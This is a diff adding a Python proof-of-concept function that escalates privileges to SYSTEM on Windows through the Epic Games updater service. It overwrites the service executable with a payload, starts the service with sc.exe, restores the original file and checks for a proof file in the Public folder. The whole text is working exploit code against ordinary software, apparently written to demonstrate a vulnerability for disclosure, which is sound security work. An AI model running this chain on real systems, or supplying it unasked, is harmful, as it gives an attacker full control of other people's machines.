@@ -1,0 +1,36 @@
+def exploit():
+    """Complete exploitation chain with restoration."""
+    exe_path = EPIC_DIR / "EpicGamesUpdater.exe"
+    backup = Path(os.environ["TEMP"]) / "EpicGamesUpdater.exe.bak"
+    payload = find_payload_exe()
+
+    # 1. Backup original
+    shutil.copy2(exe_path, backup)
+
+    # 2. Replace with payload
+    shutil.copy2(payload, exe_path)
+    log("EpicGamesUpdater.exe replaced (FULL CONTROL)")
+
+    # 3. Start SYSTEM service
+    r = subprocess.run(
+        ["sc.exe", "start", "EpicGamesUpdater"],
+        capture_output=True, text=True
+    )
+    # Error 1053 (timeout) is expected: our EXE
+    # does not implement the service API, but the code
+    # runs before the timeout
+
+    time.sleep(5)
+
+    # 4. Restore IMMEDIATELY
+    shutil.copy2(backup, exe_path)
+    backup.unlink()
+    log("Original restored. System clean.")
+
+    # 5. Verify evidence
+    evidence = Path("C:/Users/Public/epic_lpe_proof.txt")
+    if evidence.exists():
+        log("LPE TO SYSTEM CONFIRMED")
+        print(evidence.read_text())
+        return True
+    return False
